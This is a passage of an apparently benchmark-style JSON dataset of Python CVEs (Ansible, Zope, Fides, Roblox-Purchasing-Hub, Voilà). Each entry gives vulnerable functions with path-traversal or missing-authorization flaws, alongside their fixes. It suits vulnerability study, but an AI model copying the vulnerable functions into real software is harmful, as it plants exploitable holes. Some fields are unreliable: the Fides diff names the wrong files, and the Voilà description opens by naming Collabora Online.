        "snippet": "    def _remote_expand_user(self, path, sudoable=True, pathsep=None):\n        ''' takes a remote path and performs tilde/$HOME expansion on the remote host '''\n\n        # We only expand ~/path and ~username/path\n        if not path.startswith('~'):\n            return path\n\n        # Per Jborean, we don't have to worry about Windows as we don't have a notion of user's home\n        # dir there.\n        split_path = path.split(os.path.sep, 1)\n        expand_path = split_path[0]\n\n        if expand_path == '~':\n            # Network connection plugins (network_cli, netconf, etc.) execute on the controller, rather than the remote host.\n            # As such, we want to avoid using remote_user for paths  as remote_user may not line up with the local user\n            # This is a hack and should be solved by more intelligent handling of remote_tmp in 2.7\n            if getattr(self._connection, '_remote_is_local', False):\n                pass\n            elif sudoable and self._play_context.become and self._play_context.become_user:\n                expand_path = '~%s' % self._play_context.become_user\n            else:\n                # use remote user instead, if none set default to current user\n                expand_path = '~%s' % (self._play_context.remote_user or self._connection.default_user or '')\n\n        # use shell to construct appropriate command and execute\n        cmd = self._connection._shell.expand_user(expand_path)\n        data = self._low_level_execute_command(cmd, sudoable=False)\n\n        try:\n            initial_fragment = data['stdout'].strip().splitlines()[-1]\n        except IndexError:\n            initial_fragment = None\n\n        if not initial_fragment:\n            # Something went wrong trying to expand the path remotely. Try using pwd, if not, return\n            # the original string\n            cmd = self._connection._shell.pwd()\n            pwd = self._low_level_execute_command(cmd, sudoable=False).get('stdout', '').strip()\n            if pwd:\n                expanded = pwd\n            else:\n                expanded = path\n\n        elif len(split_path) > 1:\n            expanded = self._connection._shell.join_path(initial_fragment, *split_path[1:])\n        else:\n            expanded = initial_fragment\n\n        if '..' in os.path.dirname(expanded).split('/'):\n            raise AnsibleError(\"'%s' returned an invalid relative home directory path containing '..'\" % self._play_context.remote_addr)\n\n        return expanded"
      }
    ],
    "vul_patch": "--- a/lib/ansible/plugins/action/__init__.py\n+++ b/lib/ansible/plugins/action/__init__.py\n@@ -46,4 +46,7 @@\n         else:\n             expanded = initial_fragment\n \n+        if '..' in os.path.dirname(expanded).split('/'):\n+            raise AnsibleError(\"'%s' returned an invalid relative home directory path containing '..'\" % self._play_context.remote_addr)\n+\n         return expanded\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-32674",
    "cve_description": "Zope is an open-source web application server. This advisory extends the previous advisory at https://github.com/zopefoundation/Zope/security/advisories/GHSA-5pr9-v234-jw36 with additional cases of TAL expression traversal vulnerabilities. Most Python modules are not available for using in TAL expressions that you can add through-the-web, for example in Zope Page Templates. This restriction avoids file system access, for example via the 'os' module. But some of the untrusted modules are available indirectly through Python modules that are available for direct use. By default, you need to have the Manager role to add or edit Zope Page Templates through the web. Only sites that allow untrusted users to add/edit Zope Page Templates through the web are at risk. The problem has been fixed in Zope 5.2.1 and 4.6.1. The workaround is the same as for https://github.com/zopefoundation/Zope/security/advisories/GHSA-5pr9-v234-jw36: A site administrator can restrict adding/editing Zope Page Templates through the web using the standard Zope user/role permission mechanisms. Untrusted users should not be assigned the Zope Manager role and adding/editing Zope Page Templates through the web should be restricted to trusted users only.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/zopefoundation/Zope",
    "patch_url": [
      "https://github.com/zopefoundation/Zope/commit/1d897910139e2c0b11984fc9b78c1da1365bec21"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_148_1",
        "commit": "15e521b",
        "file_path": "src/Products/PageTemplates/Expressions.py",
        "start_line": 65,
        "end_line": 91,
        "snippet": "def boboAwareZopeTraverse(object, path_items, econtext):\n    \"\"\"Traverses a sequence of names, first trying attributes then items.\n\n    This uses zope.traversing path traversal where possible and interacts\n    correctly with objects providing OFS.interface.ITraversable when\n    necessary (bobo-awareness).\n    \"\"\"\n    request = getattr(econtext, 'request', None)\n    path_items = list(path_items)\n    path_items.reverse()\n\n    while path_items:\n        name = path_items.pop()\n\n        if name == '_':\n            warnings.warn('Traversing to the name `_` is deprecated '\n                          'and will be removed in Zope 6.',\n                          DeprecationWarning)\n        elif name.startswith('_'):\n            raise NotFound(name)\n\n        if OFS.interfaces.ITraversable.providedBy(object):\n            object = object.restrictedTraverse(name)\n        else:\n            object = traversePathElement(object, name, path_items,\n                                         request=request)\n    return object"
      },
      {
        "id": "vul_py_148_2",
        "commit": "15e521b",
        "file_path": "src/Products/PageTemplates/expression.py",
        "start_line": 57,
        "end_line": 79,
        "snippet": "    def traverse(cls, base, request, path_items):\n        \"\"\"See ``zope.app.pagetemplate.engine``.\"\"\"\n\n        path_items = list(path_items)\n        path_items.reverse()\n\n        while path_items:\n            name = path_items.pop()\n\n            if name == '_':\n                warnings.warn('Traversing to the name `_` is deprecated '\n                              'and will be removed in Zope 6.',\n                              DeprecationWarning)\n            elif name.startswith('_'):\n                raise NotFound(name)\n\n            if ITraversable.providedBy(base):\n                base = getattr(base, cls.traverse_method)(name)\n            else:\n                base = traversePathElement(base, name, path_items,\n                                           request=request)\n\n        return base"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_148_1",
        "commit": "1d89791",
        "file_path": "src/Products/PageTemplates/Expressions.py",
        "start_line": 66,
        "end_line": 111,
        "snippet": "def boboAwareZopeTraverse(object, path_items, econtext):\n    \"\"\"Traverses a sequence of names, first trying attributes then items.\n\n    This uses zope.traversing path traversal where possible and interacts\n    correctly with objects providing OFS.interface.ITraversable when\n    necessary (bobo-awareness).\n    \"\"\"\n    request = getattr(econtext, 'request', None)\n    validate = getSecurityManager().validate\n    path_items = list(path_items)\n    path_items.reverse()\n\n    while path_items:\n        name = path_items.pop()\n\n        if OFS.interfaces.ITraversable.providedBy(object):\n            object = object.restrictedTraverse(name)\n        else:\n            found = traversePathElement(object, name, path_items,\n                                        request=request)\n\n            # Special backwards compatibility exception for the name ``_``,\n            # which was often used for translation message factories.\n            # Allow and continue traversal.\n            if name == '_':\n                warnings.warn('Traversing to the name `_` is deprecated '\n                              'and will be removed in Zope 6.',\n                              DeprecationWarning)\n                object = found\n                continue\n\n            # All other names starting with ``_`` are disallowed.\n            # This emulates what restrictedTraverse does.\n            if name.startswith('_'):\n                raise NotFound(name)\n\n            # traversePathElement doesn't apply any Zope security policy,\n            # so we validate access explicitly here.\n            try:\n                validate(object, object, name, found)\n                object = found\n            except Unauthorized:\n                # Convert Unauthorized to prevent information disclosures\n                raise NotFound(name)\n\n    return object"
      },
      {
        "id": "fix_py_148_2",
        "commit": "1d89791",
        "file_path": "src/Products/PageTemplates/expression.py",
        "start_line": 58,
        "end_line": 105,
        "snippet": "    def traverse(cls, base, request, path_items):\n        \"\"\"See ``zope.app.pagetemplate.engine``.\"\"\"\n\n        validate = getSecurityManager().validate\n        path_items = list(path_items)\n        path_items.reverse()\n\n        while path_items:\n            name = path_items.pop()\n\n            if ITraversable.providedBy(base):\n                base = getattr(base, cls.traverse_method)(name)\n            else:\n                found = traversePathElement(base, name, path_items,\n                                            request=request)\n\n                # If traverse_method is something other than\n                # ``restrictedTraverse`` then traversal is assumed to be\n                # unrestricted. This emulates ``unrestrictedTraverse``\n                if cls.traverse_method != 'restrictedTraverse':\n                    base = found\n                    continue\n\n                # Special backwards compatibility exception for the name ``_``,\n                # which was often used for translation message factories.\n                # Allow and continue traversal.\n                if name == '_':\n                    warnings.warn('Traversing to the name `_` is deprecated '\n                                  'and will be removed in Zope 6.',\n                                  DeprecationWarning)\n                    base = found\n                    continue\n\n                # All other names starting with ``_`` are disallowed.\n                # This emulates what restrictedTraverse does.\n                if name.startswith('_'):\n                    raise NotFound(name)\n\n                # traversePathElement doesn't apply any Zope security policy,\n                # so we validate access explicitly here.\n                try:\n                    validate(base, base, name, found)\n                    base = found\n                except Unauthorized:\n                    # Convert Unauthorized to prevent information disclosures\n                    raise NotFound(name)\n\n        return base"
      }
    ],
    "vul_patch": "--- a/src/Products/PageTemplates/Expressions.py\n+++ b/src/Products/PageTemplates/Expressions.py\n@@ -6,22 +6,41 @@\n     necessary (bobo-awareness).\n     \"\"\"\n     request = getattr(econtext, 'request', None)\n+    validate = getSecurityManager().validate\n     path_items = list(path_items)\n     path_items.reverse()\n \n     while path_items:\n         name = path_items.pop()\n \n-        if name == '_':\n-            warnings.warn('Traversing to the name `_` is deprecated '\n-                          'and will be removed in Zope 6.',\n-                          DeprecationWarning)\n-        elif name.startswith('_'):\n-            raise NotFound(name)\n-\n         if OFS.interfaces.ITraversable.providedBy(object):\n             object = object.restrictedTraverse(name)\n         else:\n-            object = traversePathElement(object, name, path_items,\n-                                         request=request)\n+            found = traversePathElement(object, name, path_items,\n+                                        request=request)\n+\n+            # Special backwards compatibility exception for the name ``_``,\n+            # which was often used for translation message factories.\n+            # Allow and continue traversal.\n+            if name == '_':\n+                warnings.warn('Traversing to the name `_` is deprecated '\n+                              'and will be removed in Zope 6.',\n+                              DeprecationWarning)\n+                object = found\n+                continue\n+\n+            # All other names starting with ``_`` are disallowed.\n+            # This emulates what restrictedTraverse does.\n+            if name.startswith('_'):\n+                raise NotFound(name)\n+\n+            # traversePathElement doesn't apply any Zope security policy,\n+            # so we validate access explicitly here.\n+            try:\n+                validate(object, object, name, found)\n+                object = found\n+            except Unauthorized:\n+                # Convert Unauthorized to prevent information disclosures\n+                raise NotFound(name)\n+\n     return object\n\n--- a/src/Products/PageTemplates/expression.py\n+++ b/src/Products/PageTemplates/expression.py\n@@ -1,23 +1,48 @@\n     def traverse(cls, base, request, path_items):\n         \"\"\"See ``zope.app.pagetemplate.engine``.\"\"\"\n \n+        validate = getSecurityManager().validate\n         path_items = list(path_items)\n         path_items.reverse()\n \n         while path_items:\n             name = path_items.pop()\n \n-            if name == '_':\n-                warnings.warn('Traversing to the name `_` is deprecated '\n-                              'and will be removed in Zope 6.',\n-                              DeprecationWarning)\n-            elif name.startswith('_'):\n-                raise NotFound(name)\n-\n             if ITraversable.providedBy(base):\n                 base = getattr(base, cls.traverse_method)(name)\n             else:\n-                base = traversePathElement(base, name, path_items,\n-                                           request=request)\n+                found = traversePathElement(base, name, path_items,\n+                                            request=request)\n+\n+                # If traverse_method is something other than\n+                # ``restrictedTraverse`` then traversal is assumed to be\n+                # unrestricted. This emulates ``unrestrictedTraverse``\n+                if cls.traverse_method != 'restrictedTraverse':\n+                    base = found\n+                    continue\n+\n+                # Special backwards compatibility exception for the name ``_``,\n+                # which was often used for translation message factories.\n+                # Allow and continue traversal.\n+                if name == '_':\n+                    warnings.warn('Traversing to the name `_` is deprecated '\n+                                  'and will be removed in Zope 6.',\n+                                  DeprecationWarning)\n+                    base = found\n+                    continue\n+\n+                # All other names starting with ``_`` are disallowed.\n+                # This emulates what restrictedTraverse does.\n+                if name.startswith('_'):\n+                    raise NotFound(name)\n+\n+                # traversePathElement doesn't apply any Zope security policy,\n+                # so we validate access explicitly here.\n+                try:\n+                    validate(base, base, name, found)\n+                    base = found\n+                except Unauthorized:\n+                    # Convert Unauthorized to prevent information disclosures\n+                    raise NotFound(name)\n \n         return base\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-36827",
    "cve_description": "Fides is an open-source privacy engineering platform for managing the fulfillment of data privacy requests in a runtime environment, and the enforcement of privacy regulations in code. A path traversal (directory traversal) vulnerability affects fides versions lower than version `2.15.1`, allowing remote attackers to access arbitrary files on the fides webserver container's filesystem. The vulnerability is patched in fides `2.15.1`.\n\nIf the Fides webserver API is not directly accessible to attackers and is instead deployed behind a reverse proxy as recommended in Ethyca's security best practice documentation, and the reverse proxy is an AWS application load balancer, the vulnerability can't be exploited by these attackers. An AWS application load balancer will reject this attack with a 400 error. Additionally, any secrets supplied to the container using environment variables rather than a `fides.toml` configuration file are not affected by this vulnerability.\n",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/ethyca/fides",
    "patch_url": [
      "https://github.com/ethyca/fides/commit/f526d9ffb176006d701493c9d0eff6b4884e811f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_166_1",
        "commit": "1212ead",
        "file_path": "src/fides/api/main.py",
        "start_line": 155,
        "end_line": 197,
        "snippet": "def read_other_paths(request: Request) -> Response:\n    \"\"\"\n    Return related frontend files. Adapted from https://github.com/tiangolo/fastapi/issues/130\n    \"\"\"\n    # check first if requested file exists (for frontend assets)\n    path = request.path_params[\"catchall\"]\n\n    # search for matching route in package (i.e. /dataset)\n    ui_file = match_route(get_ui_file_map(), path)\n\n    # if not, check if the requested file is an asset (i.e. /_next/static/...)\n    if not ui_file:\n        ui_file = get_path_to_admin_ui_file(path)\n\n    # Serve up the file as long as it is within the UI directory\n    if ui_file and ui_file.is_file():\n        if not path_is_in_ui_directory(ui_file):\n            raise HTTPException(\n                status_code=status.HTTP_404_NOT_FOUND, detail=\"Item not found\"\n            )\n        logger.debug(\n            \"catchall request path '{}' matched static admin UI file: {}\",\n            path,\n            ui_file,\n        )\n        return FileResponse(ui_file)\n\n    # raise 404 for anything that should be backend endpoint but we can't find it\n    if path.startswith(API_PREFIX[1:]):\n        logger.debug(\n            \"catchall request path '{}' matched an invalid API route, return 404\",\n            path,\n        )\n        raise HTTPException(\n            status_code=status.HTTP_404_NOT_FOUND, detail=\"Item not found\"\n        )\n\n    # otherwise return the index\n    logger.debug(\n        \"catchall request path '{}' did not match any admin UI routes, return generic admin UI index\",\n        path,\n    )\n    return get_admin_index_as_response()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_166_1",
        "commit": "f526d9f",
        "file_path": "src/fides/api/common_exceptions.py",
        "start_line": 226,
        "end_line": 227,
        "snippet": "class MalisciousUrlException(Exception):\n    \"\"\"Fides has detected a potentially maliscious URL.\"\"\""
      },
      {
        "id": "fix_py_166_2",
        "commit": "f526d9f",
        "file_path": "src/fides/api/main.py",
        "start_line": 157,
        "end_line": 165,
        "snippet": "def sanitise_url_path(path: str) -> str:\n    \"\"\"Returns a URL path that does not contain any ../ or //\"\"\"\n    path = unquote(path)\n    path = os.path.normpath(path)\n    for token in path.split(\"/\"):\n        if \"..\" in token:\n            logger.warning(f\"Potentially dangerous use of URL hierarchy in path: {path}\")\n            raise MalisciousUrlException()\n    return path"
      },
      {
        "id": "fix_py_166_3",
        "commit": "f526d9f",
        "file_path": "src/fides/api/main.py",
        "start_line": 169,
        "end_line": 217,
        "snippet": "def read_other_paths(request: Request) -> Response:\n    \"\"\"\n    Return related frontend files. Adapted from https://github.com/tiangolo/fastapi/issues/130\n    \"\"\"\n    # check first if requested file exists (for frontend assets)\n    path = request.path_params[\"catchall\"]\n    logger.debug(f\"Catch all path detected: {path}\")\n    try:\n        path = sanitise_url_path(path)\n    except MalisciousUrlException:\n        # if a maliscious URL is detected, route the user to the index\n        return get_admin_index_as_response()\n\n    # search for matching route in package (i.e. /dataset)\n    ui_file = match_route(get_ui_file_map(), path)\n\n    # if not, check if the requested file is an asset (i.e. /_next/static/...)\n    if not ui_file:\n        ui_file = get_path_to_admin_ui_file(path)\n\n    # Serve up the file as long as it is within the UI directory\n    if ui_file and ui_file.is_file():\n        if not path_is_in_ui_directory(ui_file):\n            raise HTTPException(\n                status_code=status.HTTP_404_NOT_FOUND, detail=\"Item not found\"\n            )\n        logger.debug(\n            \"catchall request path '{}' matched static admin UI file: {}\",\n            path,\n            ui_file,\n        )\n        return FileResponse(ui_file)\n\n    # raise 404 for anything that should be backend endpoint but we can't find it\n    if path.startswith(API_PREFIX[1:]):\n        logger.debug(\n            \"catchall request path '{}' matched an invalid API route, return 404\",\n            path,\n        )\n        raise HTTPException(\n            status_code=status.HTTP_404_NOT_FOUND, detail=\"Item not found\"\n        )\n\n    # otherwise return the index\n    logger.debug(\n        \"catchall request path '{}' did not match any admin UI routes, return generic admin UI index\",\n        path,\n    )\n    return get_admin_index_as_response()"
      }
    ],
    "vul_patch": "--- a/src/fides/api/main.py\n+++ b/src/fides/api/common_exceptions.py\n@@ -1,43 +1,2 @@\n-def read_other_paths(request: Request) -> Response:\n-    \"\"\"\n-    Return related frontend files. Adapted from https://github.com/tiangolo/fastapi/issues/130\n-    \"\"\"\n-    # check first if requested file exists (for frontend assets)\n-    path = request.path_params[\"catchall\"]\n-\n-    # search for matching route in package (i.e. /dataset)\n-    ui_file = match_route(get_ui_file_map(), path)\n-\n-    # if not, check if the requested file is an asset (i.e. /_next/static/...)\n-    if not ui_file:\n-        ui_file = get_path_to_admin_ui_file(path)\n-\n-    # Serve up the file as long as it is within the UI directory\n-    if ui_file and ui_file.is_file():\n-        if not path_is_in_ui_directory(ui_file):\n-            raise HTTPException(\n-                status_code=status.HTTP_404_NOT_FOUND, detail=\"Item not found\"\n-            )\n-        logger.debug(\n-            \"catchall request path '{}' matched static admin UI file: {}\",\n-            path,\n-            ui_file,\n-        )\n-        return FileResponse(ui_file)\n-\n-    # raise 404 for anything that should be backend endpoint but we can't find it\n-    if path.startswith(API_PREFIX[1:]):\n-        logger.debug(\n-            \"catchall request path '{}' matched an invalid API route, return 404\",\n-            path,\n-        )\n-        raise HTTPException(\n-            status_code=status.HTTP_404_NOT_FOUND, detail=\"Item not found\"\n-        )\n-\n-    # otherwise return the index\n-    logger.debug(\n-        \"catchall request path '{}' did not match any admin UI routes, return generic admin UI index\",\n-        path,\n-    )\n-    return get_admin_index_as_response()\n+class MalisciousUrlException(Exception):\n+    \"\"\"Fides has detected a potentially maliscious URL.\"\"\"\n\n--- /dev/null\n+++ b/src/fides/api/common_exceptions.py\n@@ -0,0 +1,9 @@\n+def sanitise_url_path(path: str) -> str:\n+    \"\"\"Returns a URL path that does not contain any ../ or //\"\"\"\n+    path = unquote(path)\n+    path = os.path.normpath(path)\n+    for token in path.split(\"/\"):\n+        if \"..\" in token:\n+            logger.warning(f\"Potentially dangerous use of URL hierarchy in path: {path}\")\n+            raise MalisciousUrlException()\n+    return path\n\n--- /dev/null\n+++ b/src/fides/api/common_exceptions.py\n@@ -0,0 +1,49 @@\n+def read_other_paths(request: Request) -> Response:\n+    \"\"\"\n+    Return related frontend files. Adapted from https://github.com/tiangolo/fastapi/issues/130\n+    \"\"\"\n+    # check first if requested file exists (for frontend assets)\n+    path = request.path_params[\"catchall\"]\n+    logger.debug(f\"Catch all path detected: {path}\")\n+    try:\n+        path = sanitise_url_path(path)\n+    except MalisciousUrlException:\n+        # if a maliscious URL is detected, route the user to the index\n+        return get_admin_index_as_response()\n+\n+    # search for matching route in package (i.e. /dataset)\n+    ui_file = match_route(get_ui_file_map(), path)\n+\n+    # if not, check if the requested file is an asset (i.e. /_next/static/...)\n+    if not ui_file:\n+        ui_file = get_path_to_admin_ui_file(path)\n+\n+    # Serve up the file as long as it is within the UI directory\n+    if ui_file and ui_file.is_file():\n+        if not path_is_in_ui_directory(ui_file):\n+            raise HTTPException(\n+                status_code=status.HTTP_404_NOT_FOUND, detail=\"Item not found\"\n+            )\n+        logger.debug(\n+            \"catchall request path '{}' matched static admin UI file: {}\",\n+            path,\n+            ui_file,\n+        )\n+        return FileResponse(ui_file)\n+\n+    # raise 404 for anything that should be backend endpoint but we can't find it\n+    if path.startswith(API_PREFIX[1:]):\n+        logger.debug(\n+            \"catchall request path '{}' matched an invalid API route, return 404\",\n+            path,\n+        )\n+        raise HTTPException(\n+            status_code=status.HTTP_404_NOT_FOUND, detail=\"Item not found\"\n+        )\n+\n+    # otherwise return the index\n+    logger.debug(\n+        \"catchall request path '{}' did not match any admin UI routes, return generic admin UI index\",\n+        path,\n+    )\n+    return get_admin_index_as_response()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-41191",
    "cve_description": "Roblox-Purchasing-Hub is an open source Roblox product purchasing hub. A security risk in versions 1.0.1 and prior allowed people who have someone's API URL to get product files without an API key. This issue is fixed in version 1.0.2. As a workaround, add `@require_apikey` in `BOT/lib/cogs/website.py` under the route for `/v1/products`.",
    "cwe_info": {
      "CWE-116": {
        "name": "Improper Encoding or Escaping of Output",
        "description": "The product prepares a structured message for communication with another component, but encoding or escaping of the data is either missing or done incorrectly. As a result, the intended structure of the message is not preserved."
      }
    },
    "repo": "https://github.com/Redon-Tech/Roblox-Purchasing-Hub",
    "patch_url": [
      "https://github.com/Redon-Tech/Roblox-Purchasing-Hub/commit/58a22260eca40b1a0377daf61ccd8c4dc1440e03"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_87_1",
        "commit": "09e91fd",
        "file_path": "BOT/lib/cogs/website.py",
        "start_line": "61",
        "end_line": "67",
        "snippet": "@app.route(\"/v1/products\", methods=[\"GET\"])\nasync def products():\n    dbresponse = getproducts()\n    results = {}\n    for i in dbresponse:\n        results[i[\"name\"]] = i\n    return results"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_87_1",
        "commit": "58a2226",
        "file_path": "BOT/lib/cogs/website.py",
        "start_line": "61",
        "end_line": "68",
        "snippet": "@app.route(\"/v1/products\", methods=[\"GET\"])\n@require_apikey\nasync def products():\n    dbresponse = getproducts()\n    results = {}\n    for i in dbresponse:\n        results[i[\"name\"]] = i\n    return results"
      }
    ],
    "vul_patch": "--- a/BOT/lib/cogs/website.py\n+++ b/BOT/lib/cogs/website.py\n@@ -1,4 +1,5 @@\n @app.route(\"/v1/products\", methods=[\"GET\"])\n+@require_apikey\n async def products():\n     dbresponse = getproducts()\n     results = {}\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-30265",
    "cve_description": "Collabora Online is a collaborative online office suite based on LibreOffice technology. Any deployment of voil\u00e0 dashboard allow local file inclusion. Any file on a filesystem that is readable by the user that runs the voil\u00e0 dashboard server can be downloaded by someone with network access to the server. Whether this still requires authentication depends on how voil\u00e0 is deployed. This issue has been patched in 0.2.17, 0.3.8, 0.4.4 and 0.5.6.\n",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/voila-dashboards/voila",
    "patch_url": [
      "https://github.com/voila-dashboards/voila/commit/5542e4ae36bb5d184deaa48f95e76be477756af2",
      "https://github.com/voila-dashboards/voila/commit/00d6362c237b6b4d466873535554d6076ead0c52",
      "https://github.com/voila-dashboards/voila/commit/c045be6988539d07cceeb9f82fc660a49485d504",
      "https://github.com/voila-dashboards/voila/commit/28faacc9b03b160fd8fa920ad045f4ec0667ab67",
      "https://github.com/voila-dashboards/voila/commit/98b6a40fec27723572314fdbba99bdc147d904c8"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_279_1",
        "commit": "8419cc7",
        "file_path": "voila/app.py",
        "start_line": 574,
        "end_line": 678,
        "snippet": "    def init_settings(self) -> Dict:\n        \"\"\"Initialize settings for Voila application.\"\"\"\n        # default server_url to base_url\n        self.server_url = self.server_url or self.base_url\n\n        self.kernel_spec_manager = self.voila_configuration.kernel_spec_manager_class(\n            parent=self\n        )\n\n        # we create a config manager that load both the serverconfig and nbconfig (classical notebook)\n        read_config_path = [\n            os.path.join(p, \"serverconfig\") for p in jupyter_config_path()\n        ]\n        read_config_path += [os.path.join(p, \"nbconfig\") for p in jupyter_config_path()]\n        self.config_manager = ConfigManager(\n            parent=self, read_config_path=read_config_path\n        )\n        self.contents_manager = LargeFileManager(parent=self)\n        preheat_kernel: bool = self.voila_configuration.preheat_kernel\n        pool_size: int = self.voila_configuration.default_pool_size\n\n        if preheat_kernel and self.prelaunch_hook:\n            raise Exception(\"`preheat_kernel` and `prelaunch_hook` are incompatible\")\n\n        kernel_manager_class = voila_kernel_manager_factory(\n            self.voila_configuration.multi_kernel_manager_class,\n            preheat_kernel,\n            pool_size,\n        )\n        self.kernel_manager = kernel_manager_class(\n            parent=self,\n            connection_dir=self.connection_dir,\n            kernel_spec_manager=self.kernel_spec_manager,\n            allowed_message_types=[\n                \"comm_open\",\n                \"comm_close\",\n                \"comm_msg\",\n                \"comm_info_request\",\n                \"kernel_info_request\",\n                \"shutdown_request\",\n            ],\n        )\n\n        jenv_opt = {\n            \"autoescape\": True\n        }  # we might want extra options via cmd line like notebook server\n        env = jinja2.Environment(\n            loader=jinja2.FileSystemLoader(self.template_paths),\n            extensions=[\"jinja2.ext.i18n\"],\n            **jenv_opt,\n        )\n        server_env = jinja2.Environment(\n            loader=jinja2.FileSystemLoader(DEFAULT_TEMPLATE_PATH_LIST),\n            extensions=[\"jinja2.ext.i18n\"],\n            **jenv_opt,\n        )\n\n        nbui = gettext.translation(\n            \"nbui\", localedir=os.path.join(ROOT, \"i18n\"), fallback=True\n        )\n        env.install_gettext_translations(nbui, newstyle=False)\n        server_env.install_gettext_translations(nbui, newstyle=False)\n\n        identity_provider_kwargs = {\n            \"parent\": self,\n            \"log\": self.log,\n            \"login_handler_class\": VoilaLoginHandler,\n        }\n        if self.token is None and not self.auto_token:\n            identity_provider_kwargs[\"token\"] = \"\"\n        elif self.token is not None:\n            identity_provider_kwargs[\"token\"] = self.token\n\n        self.identity_provider = self.identity_provider_class(\n            **identity_provider_kwargs\n        )\n\n        self.authorizer = self.authorizer_class(\n            parent=self, log=self.log, identity_provider=self.identity_provider\n        )\n\n        settings = dict(\n            base_url=self.base_url,\n            server_url=self.server_url or self.base_url,\n            kernel_manager=self.kernel_manager,\n            kernel_spec_manager=self.kernel_spec_manager,\n            allow_remote_access=True,\n            autoreload=self.autoreload,\n            voila_jinja2_env=env,\n            jinja2_env=server_env,\n            static_path=\"/\",\n            server_root_dir=\"/\",\n            contents_manager=self.contents_manager,\n            config_manager=self.config_manager,\n            cookie_secret=self.cookie_secret,\n            authorizer=self.authorizer,\n            identity_provider=self.identity_provider,\n            kernel_websocket_connection_class=self.kernel_websocket_connection_class,\n            login_url=url_path_join(self.base_url, \"/login\"),\n            mathjax_config=self.mathjax_config,\n            mathjax_url=self.mathjax_url,\n        )\n        settings[self.name] = self  # Why???\n\n        return settings"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_279_1",
        "commit": "5542e4ae36bb5d184deaa48f95e76be477756af2",
        "file_path": "voila/app.py",
        "start_line": 574,
        "end_line": 677,
        "snippet": "    def init_settings(self) -> Dict:\n        \"\"\"Initialize settings for Voila application.\"\"\"\n        # default server_url to base_url\n        self.server_url = self.server_url or self.base_url\n\n        self.kernel_spec_manager = self.voila_configuration.kernel_spec_manager_class(\n            parent=self\n        )\n\n        # we create a config manager that load both the serverconfig and nbconfig (classical notebook)\n        read_config_path = [\n            os.path.join(p, \"serverconfig\") for p in jupyter_config_path()\n        ]\n        read_config_path += [os.path.join(p, \"nbconfig\") for p in jupyter_config_path()]\n        self.config_manager = ConfigManager(\n            parent=self, read_config_path=read_config_path\n        )\n        self.contents_manager = LargeFileManager(parent=self)\n        preheat_kernel: bool = self.voila_configuration.preheat_kernel\n        pool_size: int = self.voila_configuration.default_pool_size\n\n        if preheat_kernel and self.prelaunch_hook:\n            raise Exception(\"`preheat_kernel` and `prelaunch_hook` are incompatible\")\n\n        kernel_manager_class = voila_kernel_manager_factory(\n            self.voila_configuration.multi_kernel_manager_class,\n            preheat_kernel,\n            pool_size,\n        )\n        self.kernel_manager = kernel_manager_class(\n            parent=self,\n            connection_dir=self.connection_dir,\n            kernel_spec_manager=self.kernel_spec_manager,\n            allowed_message_types=[\n                \"comm_open\",\n                \"comm_close\",\n                \"comm_msg\",\n                \"comm_info_request\",\n                \"kernel_info_request\",\n                \"shutdown_request\",\n            ],\n        )\n\n        jenv_opt = {\n            \"autoescape\": True\n        }  # we might want extra options via cmd line like notebook server\n        env = jinja2.Environment(\n            loader=jinja2.FileSystemLoader(self.template_paths),\n            extensions=[\"jinja2.ext.i18n\"],\n            **jenv_opt,\n        )\n        server_env = jinja2.Environment(\n            loader=jinja2.FileSystemLoader(DEFAULT_TEMPLATE_PATH_LIST),\n            extensions=[\"jinja2.ext.i18n\"],\n            **jenv_opt,\n        )\n\n        nbui = gettext.translation(\n            \"nbui\", localedir=os.path.join(ROOT, \"i18n\"), fallback=True\n        )\n        env.install_gettext_translations(nbui, newstyle=False)\n        server_env.install_gettext_translations(nbui, newstyle=False)\n\n        identity_provider_kwargs = {\n            \"parent\": self,\n            \"log\": self.log,\n            \"login_handler_class\": VoilaLoginHandler,\n        }\n        if self.token is None and not self.auto_token:\n            identity_provider_kwargs[\"token\"] = \"\"\n        elif self.token is not None:\n            identity_provider_kwargs[\"token\"] = self.token\n\n        self.identity_provider = self.identity_provider_class(\n            **identity_provider_kwargs\n        )\n\n        self.authorizer = self.authorizer_class(\n            parent=self, log=self.log, identity_provider=self.identity_provider\n        )\n\n        settings = dict(\n            base_url=self.base_url,\n            server_url=self.server_url or self.base_url,\n            kernel_manager=self.kernel_manager,\n            kernel_spec_manager=self.kernel_spec_manager,\n            allow_remote_access=True,\n            autoreload=self.autoreload,\n            voila_jinja2_env=env,\n            jinja2_env=server_env,\n            server_root_dir=\"/\",\n            